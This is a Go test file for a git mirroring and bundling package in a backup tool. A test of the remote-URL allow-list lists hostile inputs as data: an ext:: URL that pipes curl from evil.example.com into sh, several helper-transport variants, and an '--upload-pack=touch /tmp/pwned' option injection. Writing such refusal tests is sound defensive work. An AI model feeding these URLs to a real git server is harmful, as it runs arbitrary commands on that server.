package git

import (
	"context"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"
)

// The tests drive the real git rather than a fake one, against repositories
// made in a temp directory. There is no point pretending: everything this
// package does is a claim about how git behaves — that a bundle of a mirror
// carries the tags, that a mirror restored from a bundle can fetch the
// difference — and a fake would only ever confirm what this file already
// believes.
//
// Nothing here touches the network. The local repositories are reached by path,
// which ParseRemote deliberately refuses; the tests build the Remote directly,
// which they can do because they are in this package and nothing outside it is.

func gitOrSkip(t *testing.T) {
	t.Helper()
	if !Available() {
		t.Skip("no git on this machine")
	}
}

// runIn is git for the tests' own setup, without the hardening this package
// applies to its own calls — the tests are making repositories, not fetching
// somebody else's.
func runIn(t *testing.T, dir string, args ...string) string {
	t.Helper()
	cmd := exec.Command("git", args...)
	cmd.Dir = dir
	cmd.Env = append(os.Environ(),
		"GIT_AUTHOR_NAME=T", "GIT_AUTHOR_EMAIL=t@example.com",
		"GIT_COMMITTER_NAME=T", "GIT_COMMITTER_EMAIL=t@example.com",
	)
	out, err := cmd.CombinedOutput()
	if err != nil {
		t.Fatalf("git %s: %v\n%s", strings.Join(args, " "), err, out)
	}
	return string(out)
}

// upstream builds a bare repository with two branches and a tag, and returns
// the path to it.
func upstream(t *testing.T) string {
	t.Helper()
	root := t.TempDir()
	bare := filepath.Join(root, "origin.git")
	runIn(t, root, "init", "--quiet", "--bare", bare)

	work := filepath.Join(root, "work")
	runIn(t, root, "clone", "--quiet", bare, work)
	if err := os.WriteFile(filepath.Join(work, "one.txt"), []byte("one\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	runIn(t, work, "add", ".")
	runIn(t, work, "commit", "--quiet", "-m", "one")
	runIn(t, work, "tag", "v1")
	runIn(t, work, "checkout", "--quiet", "-b", "side")
	if err := os.WriteFile(filepath.Join(work, "two.txt"), []byte("two\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	runIn(t, work, "add", ".")
	runIn(t, work, "commit", "--quiet", "-m", "two")
	runIn(t, work, "push", "--quiet", "origin", "--all")
	runIn(t, work, "push", "--quiet", "origin", "--tags")
	return bare
}

// commitTo adds one commit to the default branch of a bare repository, the way
// an upstream moving on looks from here.
func commitTo(t *testing.T, bare, name string) {
	t.Helper()
	root := t.TempDir()
	work := filepath.Join(root, "w")
	runIn(t, root, "clone", "--quiet", bare, work)
	if err := os.WriteFile(filepath.Join(work, name), []byte(name), 0o600); err != nil {
		t.Fatal(err)
	}
	runIn(t, work, "add", ".")
	runIn(t, work, "commit", "--quiet", "-m", name)
	runIn(t, work, "push", "--quiet", "origin", "HEAD")
}

func TestParseRemoteAcceptsTheFourTransports(t *testing.T) {
	for _, url := range []string{
		"https://github.com/chinmay28/sand-vault.git",
		"http://example.com/repo.git",
		"ssh://git@github.com/chinmay28/sand-vault.git",
		"git@github.com:chinmay28/sand-vault.git",
		"HTTPS://EXAMPLE.COM/repo.git",
	} {
		remote, err := ParseRemote(url)
		if err != nil {
			t.Errorf("ParseRemote(%q) = %v, want it accepted", url, err)
			continue
		}
		if remote.String() != url {
			t.Errorf("ParseRemote(%q) kept %q", url, remote.String())
		}
	}
}

// The one that matters. ext:: hands its argument to a shell, so a URL that
// reaches git is a command that runs as whoever runs the server.
func TestParseRemoteRefusesTheTransportThatRunsCommands(t *testing.T) {
	for _, url := range []string{
		`ext::sh -c "curl evil.example.com | sh"`,
		"ext::whoami",
		"transport::anything",

		// These four slipped through once. The scp-like branch below the
		// helper check accepts anything whose host holds a dot or an at sign,
		// and "a.b" is such a host — so "a.b::…" reached git, which read it as
		// the helper git-remote-a.b. No dangerous helper is spelled with a dot,
		// so it was not exploitable, but the allow-list is supposed to mean
		// "these four transports and nothing else" and it did not. The rule is
		// that a helper URL is refused whichever helper it names.
		"a.b::sh -c whoami",
		"x@y::sh -c whoami",
		"ext.::whoami",
		"git-remote-anything.co::payload",
	} {
		if _, err := ParseRemote(url); err == nil {
			t.Fatalf("ParseRemote(%q) was accepted — this reaches git's helper dispatch", url)
		}
	}

	// An IPv6 literal is full of colons and must still work in the spelling git
	// actually supports for it, which is the scheme form.
	for _, url := range []string{
		"ssh://git@[::1]/repo.git",
		"https://[2001:db8::1]/repo.git",
	} {
		if _, err := ParseRemote(url); err != nil {
			t.Errorf("ParseRemote(%q) = %v, want an IPv6 URL accepted", url, err)
		}
	}

	// And if one ever did get through, git itself is told to refuse it.
	gitOrSkip(t)
	_, err := run(t.Context(), "", "ls-remote", "--", "ext::echo hello")
	if err == nil {
		t.Fatal("git ran an ext:: transport despite protocol.ext.allow=never")
	}
	if !strings.Contains(err.Error(), "not allowed") {
		t.Errorf("refused for the wrong reason: %v", err)
	}
}

func TestParseRemoteRefusesLocalPathsAndOptions(t *testing.T) {
	for _, url := range []string{
		"",
		"   ",
		"/var/lib/secrets",
		"./repo",
		"../repo",
		"file:///etc",
		"-u/tmp/x",
		"--upload-pack=touch /tmp/pwned",
		"https://example.com/\nrepo",
		"C:\\repos\\thing",
	} {
		if _, err := ParseRemote(url); err == nil {
			t.Errorf("ParseRemote(%q) was accepted, want refused", url)
		}
	}
}

// A bundle of a mirror has to be the repository, not the checked-out branch of
// it: every branch, every tag, and a HEAD so that cloning it back gives
// somebody the default branch the project actually has.
func TestBundleCarriesEveryBranchAndTag(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)

	dir := t.TempDir()
	mirror := filepath.Join(dir, "mirror.git")
	if err := Mirror(ctx, Remote{bare}, mirror); err != nil {
		t.Fatal(err)
	}

	bundle := filepath.Join(dir, "repo.bundle")
	if err := Bundle(ctx, mirror, bundle); err != nil {
		t.Fatal(err)
	}

	// Cloning the bundle with a plain git — no SAND involved — is the property
	// worth having, so that is what the test does.
	restored := filepath.Join(dir, "restored")
	runIn(t, dir, "clone", "--quiet", bundle, restored)

	branches := runIn(t, restored, "branch", "-r")
	for _, want := range []string{"side"} {
		if !strings.Contains(branches, want) {
			t.Errorf("restored clone is missing branch %q:\n%s", want, branches)
		}
	}
	if tags := runIn(t, restored, "tag"); !strings.Contains(tags, "v1") {
		t.Errorf("restored clone is missing tag v1: %q", tags)
	}
	if head := strings.TrimSpace(runIn(t, restored, "rev-parse", "--abbrev-ref", "HEAD")); head == "HEAD" || head == "" {
		t.Errorf("restored clone has no branch checked out, got %q", head)
	}
}

// The second week has to be cheap, and this is what makes it so: the stored
// bundle becomes the local mirror, origin is pointed back at the real remote,
// and the fetch brings down only what moved.
func TestFromBundleThenFetchPicksUpWhatMoved(t *testing.T) {
	gitOrSkip(t)
	ctx := t.Context()
	bare := upstream(t)

	dir := t.TempDir()
	mirror := filepath.Join(dir, "mirror.git")
	if err := Mirror(ctx, Remote{bare}, mirror); err != nil {
		t.Fatal(err)
	}
	bundle := filepath.Join(dir, "repo.bundle")
	if err := Bundle(ctx, mirror, bundle); err != nil {
		t.Fatal(err)
	}

	before, err := Refs(ctx, mirror)
	if err != nil {
		t.Fatal(err)
	}

	commitTo(t, bare, "three.txt")

	// A week later: nothing kept but the bundle.
	restored := filepath.Join(dir, "restored.git")
	if err := FromBundle(ctx, bundle, restored, Remote{bare}); err != nil {
		t.Fatal(err)
	}
	if err := Fetch(ctx, restored); err != nil {
		t.Fatal(err)
	}

	after, err := Refs(ctx, restored)
	if err != nil {
		t.Fatal(err)
	}
	if Same(before, after) {
		t.Fatal("the mirror did not pick up the new commit")
	}

	upstreamRefs, err := LsRemote(ctx, Remote{bare})
	if err != nil {
		t.Fatal(err)
	}
	if !Same(after, upstreamRefs) {
		t.Errorf("fetched mirror does not match upstream:\n mirror=%v\n remote=%v", after, upstreamRefs)
	}
}

// The cheap half of the schedule: what a remote is holding, without cloning it.
func TestLsRemoteSeesBranchesAndTagsWithoutCloning(t *testing.T) {
	gitOrSkip(t)
	bare := upstream(t)

	refs, err := LsRemote(t.Context(), Remote{bare})
	if err != nil {
		t.Fatal(err)
	}

	byName := map[string]string{}
	for _, r := range refs {
		byName[r.Name] = r.Hash
	}
	for _, want := range []string{"refs/heads/side", "refs/tags/v1"} {
		if byName[want] == "" {
			t.Errorf("ls-remote did not report %q, got %v", want, refs)
		}
	}
	// Two entries have to be absent, and the second is the one that keeps the
	// schedule cheap: a local repository never reports HEAD, so an advertised
	// HEAD would make every stored repository differ from its own upstream for
	// ever and turn the weekly check into a weekly full fetch.
	for name := range byName {
		if strings.HasSuffix(name, "^{}") {
			t.Errorf("peeled ref %q should have been dropped", name)
		}
	}
	if _, ok := byName["HEAD"]; ok {
		t.Error("HEAD should have been dropped: show-ref never reports it, so keeping it " +
			"would make a stored repository differ from upstream on every check")
	}
}

func TestSameIgnoresOrder(t *testing.T) {
	a := []Ref{{Name: "refs/heads/main", Hash: "aa"}, {Name: "refs/tags/v1", Hash: "bb"}}
	b := []Ref{{Name: "refs/tags/v1", Hash: "bb"}, {Name: "refs/heads/main", Hash: "aa"}}
	if !Same(a, b) {
		t.Error("the same refs in a different order should compare equal")
	}
	if Same(a, []Ref{{Name: "refs/heads/main", Hash: "cc"}, {Name: "refs/tags/v1", Hash: "bb"}}) {
		t.Error("a moved branch should not compare equal")
	}
	if Same(a, a[:1]) {
		t.Error("a dropped ref should not compare equal")
	}
	if !Same(nil, nil) {
		t.Error("two empty repositories should compare equal")
	}
}

// An empty repository is a real thing to be pointed at, and show-ref reports it
// by exiting non-zero with nothing to say. That is an answer, not a failure.
func TestRefsOnAnEmptyRepository(t *testing.T) {
	gitOrSkip(t)
	dir := t.TempDir()
	bare := filepath.Join(dir, "empty.git")
	runIn(t, dir, "init", "--quiet", "--bare", bare)

	refs, err := Refs(t.Context(), bare)
	if err != nil {
		t.Fatalf("Refs on an empty repository: %v", err)
	}
	if len(refs) != 0 {
		t.Errorf("expected no refs, got %v", refs)
	}
}

// A directory left behind by an interrupted run has to be told from a mirror,
// so that it can be thrown away rather than fetched into.
func TestOperationsRefuseADirectoryThatIsNotARepository(t *testing.T) {
	gitOrSkip(t)
	dir := t.TempDir()
	ctx := t.Context()

	if err := Fetch(ctx, dir); err == nil {
		t.Error("Fetch accepted a directory with no repository in it")
	}
	if _, err := Refs(ctx, dir); err == nil {
		t.Error("Refs accepted a directory with no repository in it")
	}
	if err := Bundle(ctx, dir, filepath.Join(dir, "out.bundle")); err == nil {
		t.Error("Bundle accepted a directory with no repository in it")
	}
}

// A bundle is verified the moment it is written, because that is the last point
// at which making it again is cheap — before it is encrypted, cut into parts
// and spread over several clouds.
func TestVerifyRejectsRubbish(t *testing.T) {
	gitOrSkip(t)
	dir := t.TempDir()
	bad := filepath.Join(dir, "not.bundle")
	if err := os.WriteFile(bad, []byte("this is not a bundle"), 0o600); err != nil {
		t.Fatal(err)
	}
	if err := Verify(t.Context(), bad); err == nil {
		t.Fatal("Verify accepted a file that is not a bundle")
	}
}

// A cancelled sweep has to stop, and say that is why it stopped.
func TestRunHonoursACancelledContext(t *testing.T) {
	gitOrSkip(t)
	ctx, cancel := context.WithCancel(t.Context())
	cancel()

	if _, err := Version(ctx); err == nil {
		t.Fatal("a cancelled context still ran git")
	}
}
